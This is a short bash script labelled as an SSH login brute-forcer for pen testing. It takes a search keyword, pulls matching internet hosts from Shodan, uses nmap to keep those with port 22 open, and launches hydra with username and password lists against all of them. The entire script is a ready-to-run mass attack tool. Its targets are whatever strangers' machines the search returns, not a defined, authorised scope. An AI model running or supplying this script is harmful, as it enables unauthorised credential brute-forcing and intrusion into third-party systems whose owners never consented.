#!/bin/bash
clear
echo "SSH  Login Bruter --- PEN Testing ---"
echo "------------------------------------------"

echo "Enter search keyword:";read SysKeyWord
shodan download SH_systems "$SysKeyWord" 
shodan parse   --fields ip_str SH_systems.json.gz >SH_systems.lst

nmap -PN -p 22 -oG - --open  -iL SH_systems.lst | awk '$NF~/ssh/{print $2}' |  tee SH_systems_ssh.lst

#echo "Found some open SSH Ports"
echo '----------------->'
cat SH_systems_ssh.lst

hydra -L user.txt -P pass.txt -M SH_systems_ssh.lst ssh
